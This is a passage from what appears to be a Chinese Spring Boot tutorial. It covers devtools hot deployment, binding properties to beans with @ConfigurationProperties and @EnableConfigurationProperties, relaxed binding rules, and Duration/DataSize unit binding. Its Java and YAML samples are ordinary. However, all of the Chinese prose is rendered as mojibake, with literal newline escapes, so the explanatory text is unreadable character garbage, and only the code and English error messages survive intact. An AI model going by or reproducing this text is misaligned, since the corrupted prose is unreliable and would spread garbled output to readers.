¹æ®åŠ è½½çš„ä¸œè¥¿ä¸åŒï¼Œåˆ’åˆ†æˆbaseç±»åŠ è½½å™¨ä¸restartç±»åŠ è½½å™¨ã€‚\n\n- baseç±»åŠ è½½å™¨ï¼šç”¨æ¥åŠ è½½jaråŒ…ä¸­çš„ç±»ï¼ŒjaråŒ…ä¸­çš„ç±»å’Œé…ç½®æ–‡ä»¶ç”±äºä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤ä¸ç®¡åŠ è½½å¤šå°‘æ¬¡ï¼ŒåŠ è½½çš„å†…å®¹ä¸ä¼šå‘ç”Ÿå˜åŒ–\n- restartç±»åŠ è½½å™¨ï¼šç”¨æ¥åŠ è½½å¼€å‘è€…è‡ªå·±å¼€å‘çš„ç±»ã€é…ç½®æ–‡ä»¶ã€é¡µé¢ç­‰ä¿¡æ¯ï¼Œè¿™ä¸€ç±»æ–‡ä»¶å—å¼€å‘è€…å½±å“\n\nâ€‹\t\tå½“springbooté¡¹ç›®å¯åŠ¨æ—¶ï¼Œbaseç±»åŠ è½½å™¨æ‰§è¡Œï¼ŒåŠ è½½jaråŒ…ä¸­çš„ä¿¡æ¯åï¼Œrestartç±»åŠ è½½å™¨æ‰§è¡Œï¼ŒåŠ è½½å¼€å‘è€…åˆ¶ä½œçš„å†…å®¹ã€‚å½“æ‰§è¡Œæ„å»ºé¡¹ç›®åï¼Œç”±äºjarä¸­çš„ä¿¡æ¯ä¸ä¼šå˜åŒ–ï¼Œå› æ­¤baseç±»åŠ è½½å™¨æ— éœ€å†æ¬¡æ‰§è¡Œï¼Œæ‰€ä»¥ä»…ä»…è¿è¡Œrestartç±»åŠ è½½å³å¯ï¼Œä¹Ÿå°±æ˜¯å°†å¼€å‘è€…è‡ªå·±åˆ¶ä½œçš„å†…å®¹é‡æ–°åŠ è½½å°±è¡Œäº†ï¼Œè¿™å°±å®Œæˆäº†ä¸€æ¬¡çƒ­éƒ¨ç½²çš„è¿‡ç¨‹ï¼Œä¹Ÿå¯ä»¥è¯´çƒ­éƒ¨ç½²çš„è¿‡ç¨‹å®é™…ä¸Šæ˜¯é‡æ–°åŠ è½½restartç±»åŠ è½½å™¨ä¸­çš„ä¿¡æ¯ã€‚\n\n### â‘¢è‡ªåŠ¨å¯åŠ¨çƒ­éƒ¨ç½²\n\nä¸Šè¿°è¿‡ç¨‹æ¯æ¬¡è¿›è¡Œçƒ­éƒ¨ç½²éƒ½éœ€è¦å¼€å‘è€…æ‰‹å·¥æ“ä½œï¼Œä¸ç®¡æ˜¯ç‚¹å‡»æŒ‰é’®è¿˜æ˜¯å¿«æ·é”®éƒ½éœ€è¦å¼€å‘è€…æ‰‹å·¥æ‰§è¡Œã€‚\n\nè‡ªåŠ¨çƒ­éƒ¨ç½²å…¶å®å°±æ˜¯è®¾è®¡ä¸€ä¸ªå¼€å…³ï¼Œæ‰“å¼€è¿™ä¸ªå¼€å…³åï¼ŒIDEå·¥å…·å°±å¯ä»¥è‡ªåŠ¨çƒ­éƒ¨ç½²ã€‚å› æ­¤è¿™ä¸ªæ“ä½œå’ŒIDEå·¥å…·æœ‰å…³ï¼Œä»¥ä¸‹ä»¥ideaä¸ºä¾‹è®¾ç½®ideaä¸­å¯åŠ¨çƒ­éƒ¨ç½²\n\n**æ­¥éª¤â‘ **ï¼šè®¾ç½®è‡ªåŠ¨æ„å»ºé¡¹ç›®\n\næ‰“å¼€ã€Fileã€‘ï¼Œé€‰æ‹©ã€settings...ã€‘,åœ¨é¢æ¿å·¦ä¾§çš„èœå•ä¸­æ‰¾åˆ°ã€Compileã€‘é€‰é¡¹ï¼Œç„¶åå‹¾é€‰ã€Build project automaticallyã€‘ï¼Œæ„æ€æ˜¯è‡ªåŠ¨æ„å»ºé¡¹ç›®\n\n![](https://img.jwt1399.top/img/202209122128893.png)\n\n**æ­¥éª¤â‘¡**ï¼šå…è®¸åœ¨ç¨‹åºè¿è¡Œæ—¶è¿›è¡Œè‡ªåŠ¨æ„å»º\n\n- è€ç‰ˆIDEAæ“ä½œæ–¹æ³•ï¼š\n\nä½¿ç”¨å¿«æ·é”®ã€Ctrl+Alt+Shift+/ æˆ–è€… command+option+shift+/ã€‘æ‰“å¼€ç»´æŠ¤é¢æ¿ï¼Œé€‰æ‹©ç¬¬1é¡¹ã€Registry...ã€‘\n\n![](https://img.jwt1399.top/img/202209122136780.png)\n\nåœ¨é€‰é¡¹ä¸­æœç´¢compleï¼Œç„¶åå‹¾é€‰å¯¹åº”é¡¹å³å¯\n\n<img src=\"https://img.jwt1399.top/img/202209122136899.png\"  style=\"zoom:80%;\" />\n\n- æ–°ç‰ˆæœ¬IDEAæ“ä½œæ–¹æ³•\n\n![](https://img.jwt1399.top/img/202209122136714.png)\n\n<font color=\"#ff0000\"><b>å…³æ³¨</b></font>ï¼šå¦‚æœä½ æ¯æ•²ä¸€ä¸ªå­—æ¯ï¼ŒæœåŠ¡å™¨å°±é‡æ–°æ„å»ºä¸€æ¬¡ï¼Œè¿™æœªå…æœ‰ç‚¹å¤ªé¢‘ç¹äº†ï¼Œæ‰€ä»¥ideaè®¾ç½®å½“ideaå·¥å…·å¤±å»ç„¦ç‚¹5ç§’åè¿›è¡Œçƒ­éƒ¨ç½²ã€‚å…¶å®å°±æ˜¯ä½ ä»ideaå·¥å…·ä¸­åˆ‡æ¢åˆ°å…¶ä»–å·¥å…·æ—¶è¿›è¡Œçƒ­éƒ¨ç½²ï¼Œæ¯”å¦‚æ”¹å®Œç¨‹åºéœ€è¦åˆ°æµè§ˆå™¨ä¸Šå»è°ƒè¯•ï¼Œè¿™ä¸ªæ—¶å€™ideaå°±è‡ªåŠ¨è¿›è¡Œçƒ­éƒ¨ç½²æ“ä½œã€‚\n\n### â‘£çƒ­éƒ¨ç½²èŒƒå›´é…ç½®\n\nå…¶å®å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ–‡ä»¶ä¿®æ”¹éƒ½ä¼šæ¿€æ´»çƒ­éƒ¨ç½²çš„ï¼ŒåŸå› åœ¨äºåœ¨å¼€å‘è€…å·¥å…·ä¸­æœ‰ä¸€ç»„é…ç½®ï¼Œå½“æ»¡è¶³äº†é…ç½®ä¸­çš„æ¡ä»¶åï¼Œæ‰ä¼šå¯åŠ¨çƒ­éƒ¨ç½²ï¼Œé…ç½®ä¸­é»˜è®¤ä¸å‚ä¸çƒ­éƒ¨ç½²çš„ç›®å½•ä¿¡æ¯å¦‚ä¸‹\n\n- /META-INF/maven\n- /META-INF/resources\n- /resources\n- /static\n- /public\n- /templates\n\nä»¥ä¸Šç›®å½•ä¸­çš„æ–‡ä»¶å¦‚æœå‘ç”Ÿå˜åŒ–ï¼Œæ˜¯ä¸å‚ä¸çƒ­éƒ¨ç½²çš„ã€‚å¦‚æœæƒ³ä¿®æ”¹é…ç½®ï¼Œå¯ä»¥é€šè¿‡application.ymlæ–‡ä»¶è¿›è¡Œè®¾å®šå“ªäº›æ–‡ä»¶ä¸å‚ä¸çƒ­éƒ¨ç½²æ“ä½œ\n\n```yaml\nspring:\n  devtools:\n    restart:\n      # è®¾ç½®ä¸å‚ä¸çƒ­éƒ¨ç½²çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹\n      exclude: static/**,public/**,config/application.yml\n```\n\n### â‘¤å…³é—­çƒ­éƒ¨ç½²\n\nçº¿ä¸Šç¯å¢ƒè¿è¡Œæ—¶æ˜¯ä¸å¯èƒ½ä½¿ç”¨çƒ­éƒ¨ç½²åŠŸèƒ½çš„ï¼Œæ‰€ä»¥éœ€è¦å¼ºåˆ¶å…³é—­æ­¤åŠŸèƒ½ï¼Œé€šè¿‡é…ç½®å¯ä»¥å…³é—­æ­¤åŠŸèƒ½ã€‚\n\n```yaml\nspring:\n  devtools:\n    restart:\n      enabled: false\n```\n\nå¦‚æœå½“å¿ƒé…ç½®æ–‡ä»¶å±‚çº§è¿‡å¤šå¯¼è‡´ç›¸ç¬¦è¦†ç›–æœ€ç»ˆå¼•èµ·é…ç½®å¤±æ•ˆï¼Œå¯ä»¥æé«˜é…ç½®çš„å±‚çº§ï¼Œåœ¨æ›´é«˜å±‚çº§ä¸­é…ç½®å…³é—­çƒ­éƒ¨ç½²ã€‚ä¾‹å¦‚åœ¨å¯åŠ¨å®¹å™¨å‰é€šè¿‡ç³»ç»Ÿå±æ€§è®¾ç½®å…³é—­çƒ­éƒ¨ç½²åŠŸèƒ½ã€‚\n\n```java\n@SpringBootApplication\npublic class SSMPApplication {\n    public static void main(String[] args) {\n        System.setProperty(\"spring.devtools.restart.enabled\",\"false\");\n        SpringApplication.run(SSMPApplication.class);\n    }\n}\n```\n\n## 2.é…ç½®è¿›é˜¶\n\n### â‘ @ConfigurationProperties\n\nåœ¨åŸºç¡€ç¯‡å­¦ä¹ äº†@ConfigurationPropertiesæ³¨è§£ï¼Œæ­¤æ³¨è§£çš„ä½œç”¨æ˜¯ç”¨æ¥ä¸ºbeanç»‘å®šå±æ€§çš„ã€‚\n\n**a.**å¼€å‘è€…å¯ä»¥åœ¨ymlé…ç½®æ–‡ä»¶ä¸­ä»¥å¯¹è±¡çš„æ ¼å¼æ·»åŠ è‹¥å¹²å±æ€§\n\n```YML\nservers:\n  ip-address: 192.168.0.1 \n  port: 2345\n  timeout: -1\n```\n\n**b.**ç„¶åå†å¼€å‘ä¸€ä¸ªç”¨æ¥å°è£…æ•°æ®çš„å®ä½“ç±»ï¼Œæ³¨æ„è¦æä¾›å±æ€§å¯¹åº”çš„setteræ–¹æ³•\n\n```java\n@Component\n@Data\npublic class ServerConfig {\n    private String ipAddress;\n    private int port;\n    private long timeout;\n}\n```\n\n**c.**ä½¿ç”¨`@ConfigurationProperties`æ³¨è§£å°±å¯ä»¥å°†é…ç½®ä¸­çš„å±æ€§å€¼å…³è”åˆ°å¼€å‘çš„æ¨¡å‹ç±»ä¸Š\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    private String ipAddress;\n    private int port;\n    private long timeout;\n}\n```\n\nè¿™æ ·åŠ è½½å¯¹åº”beançš„æ—¶å€™å°±å¯ä»¥ç›´æ¥åŠ è½½é…ç½®å±æ€§å€¼äº†ã€‚\n\n**d.**ä½¿ç”¨@ConfigurationPropertiesæ³¨è§£æ—¶ï¼Œä¼šå‡ºç°ä¸€ä¸ªæç¤ºä¿¡æ¯\n\n![](https://img.jwt1399.top/img/202209171203135.png)\n\nå‡ºç°è¿™ä¸ªæç¤ºååªéœ€è¦æ·»åŠ ä¸€ä¸ªåæ ‡æ­¤æé†’å°±æ¶ˆå¤±äº†\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n```\n\n> ä½†æ˜¯ç›®å‰æˆ‘ä»¬å­¦çš„éƒ½æ˜¯ç»™è‡ªå®šä¹‰çš„beanä½¿ç”¨è¿™ç§å½¢å¼åŠ è½½å±æ€§å€¼ï¼Œå¦‚æœæ˜¯ç¬¬ä¸‰æ–¹çš„beanå‘¢ï¼Ÿèƒ½ä¸èƒ½ç”¨è¿™ç§å½¢å¼åŠ è½½å±æ€§å€¼å‘¢ï¼Ÿä¸ºä»€ä¹ˆä¼šæå‡ºè¿™ä¸ªç–‘é—®ï¼ŸåŸå› å°±åœ¨äºå½“å‰@ConfigurationPropertiesæ³¨è§£æ˜¯å†™åœ¨ç±»å®šä¹‰çš„ä¸Šæ–¹ï¼Œè€Œç¬¬ä¸‰æ–¹å¼€å‘çš„beanæºä»£ç ä¸æ˜¯ä½ è‡ªå·±ä¹¦å†™çš„ï¼Œä½ ä¹Ÿä¸å¯èƒ½åˆ°æºä»£ç ä¸­å»æ·»åŠ @ConfigurationPropertiesæ³¨è§£ï¼Œè¿™ç§é—®é¢˜è¯¥æ€ä¹ˆè§£å†³å‘¢ï¼Ÿä¸‹é¢å°±æ¥è¯´è¯´è¿™ä¸ªé—®é¢˜ã€‚\n\nä½¿ç”¨@ConfigurationPropertiesæ³¨è§£å…¶å®ä¹Ÿå¯ä»¥ä¸ºç¬¬ä¸‰æ–¹beanåŠ è½½å±æ€§ï¼Œæ ¼å¼ç‰¹æ®Šä¸€ç‚¹è€Œå·²ã€‚\n\n**æ­¥éª¤â‘ **ï¼šä½¿ç”¨@Beanæ³¨è§£å®šä¹‰ç¬¬ä¸‰æ–¹bean\n\n```java\n@Bean\npublic DruidDataSource datasource(){\n    DruidDataSource ds = new DruidDataSource();\n    return ds;\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šåœ¨ymlä¸­å®šä¹‰è¦ç»‘å®šçš„å±æ€§ï¼Œæ³¨æ„datasourceæ­¤æ—¶å…¨å°å†™\n\n```yaml\ndatasource:\n  driverClassName: com.mysql.jdbc.Driver\n```\n\n**æ­¥éª¤â‘¢**ï¼šä½¿ç”¨@ConfigurationPropertiesæ³¨è§£ä¸ºç¬¬ä¸‰æ–¹beanè¿›è¡Œå±æ€§ç»‘å®šï¼Œæ³¨æ„å‰ç¼€æ˜¯å…¨å°å†™çš„datasource\n\n```java\n@Bean\n@ConfigurationProperties(prefix = \"datasource\")\npublic DruidDataSource datasource(){\n    DruidDataSource ds = new DruidDataSource();\n    return ds;\n}\n```\n\næ“ä½œæ–¹å¼å®Œå…¨ä¸€æ ·ï¼Œåªä¸è¿‡@ConfigurationPropertiesæ³¨è§£ä¸ä»…èƒ½æ·»åŠ åˆ°ç±»ä¸Šï¼Œè¿˜å¯ä»¥æ·»åŠ åˆ°æ–¹æ³•ä¸Šï¼Œæ·»åŠ åˆ°ç±»ä¸Šæ˜¯ä¸ºspringå®¹å™¨ç®¡ç†çš„å½“å‰ç±»çš„å¯¹è±¡ç»‘å®šå±æ€§ï¼Œæ·»åŠ åˆ°æ–¹æ³•ä¸Šæ˜¯ä¸ºspringå®¹å™¨ç®¡ç†çš„å½“å‰æ–¹æ³•çš„è¿”å›å€¼å¯¹è±¡ç»‘å®šå±æ€§ï¼Œå…¶å®æœ¬è´¨ä¸Šéƒ½ä¸€æ ·ã€‚\n\n### â‘¡@EnableConfigurationProperties\n\n> ç›®å‰æˆ‘ä»¬å®šä¹‰beanä¸æ˜¯é€šè¿‡`@Component`å®šä¹‰å°±æ˜¯é€šè¿‡`@Bean`å®šä¹‰ï¼Œä½¿ç”¨`@ConfigurationProperties`æ³¨è§£å¯ä»¥ä¸ºbeanè¿›è¡Œå±æ€§ç»‘å®šï¼Œé‚£åœ¨ä¸€ä¸ªä¸šåŠ¡ç³»ç»Ÿä¸­ï¼Œå“ªäº›beané€šè¿‡æ³¨è§£@ConfigurationPropertieså»ç»‘å®šå±æ€§äº†å‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªæ³¨è§£ä¸ä»…å¯ä»¥å†™åœ¨ç±»ä¸Šï¼Œè¿˜å¯ä»¥å†™åœ¨æ–¹æ³•ä¸Šï¼Œæ‰€ä»¥æ‰¾èµ·æ¥å°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚\n>\n> ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œspringç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå…¨æ–°çš„æ³¨è§£ï¼Œä¸“é—¨æ ‡æ³¨ä½¿ç”¨`@ConfigurationProperties`æ³¨è§£ç»‘å®šå±æ€§çš„beanæ˜¯å“ªäº›ã€‚è¿™ä¸ªæ³¨è§£å«åš`@EnableConfigurationProperties`ã€‚å…·ä½“å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿ\n\n**æ­¥éª¤â‘ **ï¼šåœ¨é…ç½®ç±»ä¸Šå¼€å¯`@EnableConfigurationProperties`æ³¨è§£ï¼Œå¹¶æ ‡æ³¨è¦ä½¿ç”¨@ConfigurationPropertiesæ³¨è§£ç»‘å®šå±æ€§çš„ç±»\n\n```java\n@SpringBootApplication\n@EnableConfigurationProperties(ServerConfig.class)\npublic class SpringbootConfigurationApplication {\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šåœ¨å¯¹åº”çš„ç±»ä¸Šç›´æ¥ä½¿ç”¨@ConfigurationPropertiesè¿›è¡Œå±æ€§ç»‘å®š\n\n```java\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    private String ipAddress;\n    private int port;\n    private long timeout;\n}\n```\n\næœ‰äººæ„Ÿè§‰è¿™æ²¡åŒºåˆ«å•Šï¼Ÿæ³¨æ„è§‚å¯Ÿï¼Œç°åœ¨ç»‘å®šå±æ€§çš„ServerConfigç±»å¹¶æ²¡æœ‰å£°æ˜`@Component`æ³¨è§£ã€‚å½“ä½¿ç”¨`@EnableConfigurationProperties`æ³¨è§£æ—¶ï¼Œspringä¼šé»˜è®¤å°†å…¶æ ‡æ³¨çš„ç±»å®šä¹‰ä¸ºbeanï¼Œå› æ­¤æ— éœ€å†æ¬¡å£°æ˜`@Component`æ³¨è§£äº†ã€‚\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨@ConfigurationPropertieså¯ä»¥ä¸ºä½¿ç”¨@Beanå£°æ˜çš„ç¬¬ä¸‰æ–¹beanç»‘å®šå±æ€§\n2. å½“ä½¿ç”¨@EnableConfigurationPropertieså£°æ˜è¿›è¡Œå±æ€§ç»‘å®šçš„beanåï¼Œæ— éœ€ä½¿ç”¨@Componentæ³¨è§£å†æ¬¡è¿›è¡Œbeanå£°æ˜\n\n### â‘¢æ¾æ•£ç»‘å®š\n\nåœ¨è¿›è¡Œå±æ€§ç»‘å®šæ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹æƒ…å†µï¼Œä¸ºäº†è¿›è¡Œæ ‡å‡†å‘½åï¼Œå¼€å‘è€…ä¼šå°†å±æ€§åä¸¥æ ¼æŒ‰ç…§é©¼å³°å‘½åæ³•ä¹¦å†™ï¼Œåœ¨ymlé…ç½®æ–‡ä»¶ä¸­å°†datasourceä¿®æ”¹ä¸ºdataSourceï¼Œæ­¤æ—¶ç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œ\n\n```yaml\ndataSource:\n  driverClassName: com.mysql.jdbc.Driver\n```\n\nç„¶ååˆå°†ä»£ç ä¸­çš„å‰ç¼€datasourceä¿®æ”¹ä¸ºdataSource\n\n```java\n@Bean\n@ConfigurationProperties(prefix = \"dataSource\")\npublic DruidDataSource datasource(){\n    DruidDataSource ds = new DruidDataSource();\n    return ds;\n}\n```\n\næ­¤æ—¶å°±å‘ç”Ÿäº†ç¼–è¯‘é”™è¯¯ï¼Œè€Œä¸”å¹¶ä¸æ˜¯ideaå·¥å…·å¯¼è‡´çš„ï¼Œè¿è¡Œåä¾ç„¶ä¼šå‡ºç°é—®é¢˜ï¼Œé…ç½®å±æ€§ådataSourceæ˜¯æ— æ•ˆçš„\n\n```bash\nConfiguration property name 'dataSource' is not valid:\n\n    Invalid characters: 'S'\n    Bean: datasource\n    Reason: Canonical names should be kebab-case ('-' separated), lowercase alpha-numeric characters and must start with a letter\n\nAction:\nModify 'dataSource' so that it conforms to the canonical names requirements.\n```\n\nä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§é—®é¢˜ï¼Œè¿™å°±è¦æ¥è¯´ä¸€è¯´springbootè¿›è¡Œå±æ€§ç»‘å®šæ—¶çš„ä¸€ä¸ªé‡è¦çŸ¥è¯†ç‚¹äº†ï¼Œæœ‰å…³å±æ€§åç§°çš„å®½æ¾ç»‘å®šï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºå®½æ¾ç»‘å®šã€‚\n\n> ä»€ä¹ˆæ˜¯å®½æ¾ç»‘å®šï¼Ÿå®é™…ä¸Šæ˜¯springbootè¿›è¡Œç¼–ç¨‹æ—¶äººæ€§åŒ–è®¾è®¡çš„ä¸€ç§ä½“ç°ï¼Œå³é…ç½®æ–‡ä»¶ä¸­çš„å‘½åæ ¼å¼ä¸å˜é‡åçš„å‘½åæ ¼å¼å¯ä»¥è¿›è¡Œæ ¼å¼ä¸Šçš„æœ€å¤§åŒ–å…¼å®¹ã€‚å…¼å®¹åˆ°ä»€ä¹ˆç¨‹åº¦å‘¢ï¼Ÿå‡ ä¹ä¸»æµçš„å‘½åæ ¼å¼éƒ½æ”¯æŒï¼Œä¾‹å¦‚ï¼š\n\nåœ¨ServerConfigä¸­çš„ipAddresså±æ€§å\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    private String ipAddress;\n}\n```\n\nå¯ä»¥ä¸ä¸‹é¢çš„é…ç½®å±æ€§åè§„åˆ™å…¨å…¼å®¹\n\n```yaml\nservers:\n  ipAddress: 192.168.0.2       # é©¼å³°æ¨¡å¼\n  ip_address: 192.168.0.2      # ä¸‹åˆ’çº¿æ¨¡å¼\n  ip-address: 192.168.0.2      # çƒ¤è‚‰ä¸²æ¨¡å¼\n  IP_ADDRESS: 192.168.0.2      # å¸¸é‡æ¨¡å¼\n```\n\nä¹Ÿå¯ä»¥è¯´ï¼Œä»¥ä¸Š4ç§æ¨¡å¼æœ€ç»ˆéƒ½å¯ä»¥åŒ¹é…åˆ°ipAddressè¿™ä¸ªå±æ€§åã€‚ä¸ºä»€ä¹ˆè¿™æ ·å‘¢ï¼ŸåŸå› å°±æ˜¯åœ¨è¿›è¡ŒåŒ¹é…æ—¶ï¼Œé…ç½®ä¸­çš„åç§°è¦å»æ‰ä¸­åˆ’çº¿å’Œä¸‹åˆ’çº¿åï¼Œå¿½ç•¥å¤§å°å†™çš„æƒ…å†µä¸‹å»ä¸javaä»£ç ä¸­çš„å±æ€§åè¿›è¡Œå¿½ç•¥å¤§å°å†™çš„ç­‰å€¼åŒ¹é…ï¼Œä»¥ä¸Š4ç§å‘½åå»æ‰ä¸‹åˆ’çº¿ä¸­åˆ’çº¿å¿½ç•¥å¤§å°å†™åéƒ½æ˜¯ä¸€ä¸ªè¯ipaddressï¼Œjavaä»£ç ä¸­çš„å±æ€§åå¿½ç•¥å¤§å°å†™åä¹Ÿæ˜¯ipaddressï¼Œè¿™æ ·å°±å¯ä»¥è¿›è¡Œç­‰å€¼åŒ¹é…äº†ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™4ç§æ ¼å¼éƒ½èƒ½åŒ¹é…æˆåŠŸçš„åŸå› ã€‚ä¸è¿‡springbootå®˜æ–¹æ¨èä½¿ç”¨çƒ¤è‚‰ä¸²æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯ä¸­åˆ’çº¿æ¨¡å¼ã€‚\n\nåˆ°è¿™é‡Œæˆ‘ä»¬æŒæ¡äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯å‘½åçš„è§„èŒƒé—®é¢˜ã€‚å†æ¥çœ‹å¼€å§‹å‡ºç°çš„ç¼–ç¨‹é”™è¯¯ä¿¡æ¯\n\n```bash\nConfiguration property name 'dataSource' is not valid:\n\n    Invalid characters: 'S'\n    Bean: datasource\n    Reason: Canonical names should be kebab-case ('-' separated), lowercase alpha-numeric characters and must start with a letter\n\nAction:\nModify 'dataSource' so that it conforms to the canonical names requirements.\n```\n\nå…¶ä¸­Reasonæè¿°äº†æŠ¥é”™çš„åŸå› ï¼Œè§„èŒƒçš„åç§°åº”è¯¥æ˜¯çƒ¤è‚‰ä¸²(kebab)æ¨¡å¼(case)ï¼Œå³ä½¿ç”¨-åˆ†éš”ï¼Œä½¿ç”¨å°å†™å­—æ¯æ•°å­—ä½œä¸ºæ ‡å‡†å­—ç¬¦ï¼Œä¸”å¿…é¡»ä»¥å­—æ¯å¼€å¤´ã€‚ç„¶åå†çœ‹æˆ‘ä»¬å†™çš„åç§°dataSourceï¼Œå°±ä¸æ»¡è¶³ä¸Šè¿°è¦æ±‚ã€‚é—¹äº†åŠå¤©ï¼Œåœ¨ä¹¦å†™å‰ç¼€æ—¶ï¼Œè¿™ä¸ªè¯ä¸æ˜¯éšæ„æ”¯æŒçš„ï¼Œå¿…é¡»ä½¿ç”¨ä¸Šè¿°æ ‡å‡†ã€‚\n\næœ€åè¯´ä¸€å¥ï¼Œä»¥ä¸Šè§„åˆ™ä»…é’ˆå¯¹springbootä¸­@ConfigurationPropertiesæ³¨è§£è¿›è¡Œå±æ€§ç»‘å®šæ—¶æœ‰æ•ˆï¼Œå¯¹@Valueæ³¨è§£è¿›è¡Œå±æ€§æ˜ å°„æ— æ•ˆã€‚\n\n**æ€»ç»“**\n\n1. @ConfigurationPropertiesç»‘å®šå±æ€§æ—¶æ”¯æŒå±æ€§åå®½æ¾ç»‘å®šï¼Œè¿™ä¸ªå®½æ¾ä½“ç°åœ¨å±æ€§åçš„å‘½åè§„åˆ™ä¸Š\n2. @Valueæ³¨è§£ä¸æ”¯æŒæ¾æ•£ç»‘å®šè§„åˆ™\n3. ç»‘å®šå‰ç¼€åæ¨èé‡‡ç”¨çƒ¤è‚‰ä¸²å‘½åè§„åˆ™ï¼Œå³ä½¿ç”¨ä¸­åˆ’çº¿åšåˆ†éš”ç¬¦\n\n### â‘£è®¡é‡å•ä½ç»‘å®š\n\nåœ¨é…ç½®ä¸­ï¼Œæˆ‘ä»¬ä¹¦å†™å¦‚ä¸‹é…ç½®å€¼ï¼Œå…¶ä¸­ç¬¬ä¸‰é¡¹è¶…æ—¶æ—¶é—´timeoutæè¿°äº†æœåŠ¡å™¨æ“ä½œè¶…æ—¶æ—¶é—´ï¼Œå½“å‰å€¼æ˜¯-1è¡¨ç¤ºæ°¸ä¸è¶…æ—¶ã€‚\n\n```yaml\nservers:\n  ip-address: 192.168.0.1 \n  port: 2345\n  timeout: -1\n```\n\n> ä½†æ˜¯æ¯ä¸ªäººå¯¹è¿™ä¸ªå€¼çš„ç†è§£ä¼šäº§ç”Ÿä¸åŒï¼Œæ¯”å¦‚çº¿ä¸ŠæœåŠ¡å™¨å®Œæˆä¸€æ¬¡ä¸»ä»å¤‡ä»½ï¼Œé…ç½®è¶…æ—¶æ—¶é—´240ï¼Œè¿™ä¸ª240å¦‚æœå•ä½æ˜¯ç§’å°±æ˜¯è¶…æ—¶æ—¶é—´4åˆ†é’Ÿï¼Œå¦‚æœå•ä½æ˜¯åˆ†é’Ÿå°±æ˜¯è¶…æ—¶æ—¶é—´4å°æ—¶ã€‚è¿™ä¸ªæ—¶å€™é—®é¢˜å°±æ¥äº†ï¼Œæ€ä¹ˆè§£å†³è¿™ä¸ªè¯¯ä¼šï¼Ÿ\n\né™¤äº†åŠ å¼ºçº¦å®šä¹‹å¤–ï¼Œspringbootå……åˆ†åˆ©ç”¨äº†JDK8ä¸­æä¾›çš„å…¨æ–°çš„è®¡é‡å•ä½çš„æ–°æ•°æ®ç±»å‹ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ä»¥ä¸‹æ¨¡å‹ç±»ä¸­æ·»åŠ äº†ä¸¤ä¸ªJDK8ä¸­æ–°å¢çš„ç±»ï¼Œåˆ†åˆ«æ˜¯Durationå’ŒDataSize\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    @DurationUnit(ChronoUnit.HOURS)\n    private Duration serverTimeOut;\n    @DataSizeUnit(DataUnit.MEGABYTES)\n    private DataSize dataSize;\n}\n```\n\n- **Duration**ï¼šè¡¨ç¤ºæ—¶é—´é—´éš”ï¼Œå¯ä»¥é€šè¿‡@DurationUnitæ³¨è§£æè¿°æ—¶é—´å•ä½ï¼Œä¾‹å¦‚ä¸Šä¾‹ä¸­æè¿°çš„å•ä½ä¸ºå°æ—¶ï¼ˆChronoUnit.HOURSï¼‰\n\n- **DataSize**ï¼šè¡¨ç¤ºå­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥é€šè¿‡@DataSizeUnitæ³¨è§£æè¿°å­˜å‚¨ç©ºé—´å•ä½ï¼Œä¾‹å¦‚ä¸Šä¾‹ä¸­æè¿°çš„å•ä½ä¸ºMBï¼ˆDataUnit.MEGABYTESï¼‰\n\nâ€‹\t\tä½¿ç”¨ä¸Šè¿°ä¸¤ä¸ªå•ä½å°±å¯ä»¥æœ‰æ•ˆé¿å…å› æ²Ÿé€šä¸åŒæ­¥æˆ–æ–‡æ¡£ä¸å¥å…¨å¯¼è‡´çš„ä¿¡æ¯ä¸å¯¹ç§°é—®é¢˜ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³äº†é—®é¢˜ï¼Œé¿å…äº§ç”Ÿè¯¯è¯»ã€‚\n\n### â‘¤å±æ€§æ ¡éªŒ\n\n> åœ¨ymlæ–‡ä»¶ä¸­ä¹¦å†™é…ç½®æ—¶ç”±äºæ— æ³•æ„ŸçŸ¥æ¨¡å‹ç±»ä¸­çš„æ•°æ®ç±»å‹ï¼Œå°±ä¼šå‡ºç°ç±»å‹ä¸åŒ¹é…çš„é—®é¢˜ï¼Œæ¯”å¦‚ä»£ç ä¸­éœ€è¦intç±»å‹ï¼Œé…ç½®ä¸­ç»™äº†éæ³•çš„æ•°å€¼ï¼Œä¾‹å¦‚å†™ä¸€ä¸ªâ€œa\"ï¼Œè¿™ç§æ•°æ®è‚¯å®šæ— æ³•æœ‰æ•ˆçš„ç»‘å®šï¼Œè¿˜ä¼šå¼•å‘é”™è¯¯ã€‚\t\t\n>\n> SpringBootç»™å‡ºäº†å¼ºå¤§çš„æ•°æ®æ ¡éªŒåŠŸèƒ½ï¼Œå¯ä»¥æœ‰æ•ˆçš„é¿å…æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚åœ¨javaEEçš„JSR303è§„èŒƒä¸­ç»™å‡ºäº†å…·ä½“çš„æ•°æ®æ ¡éªŒæ 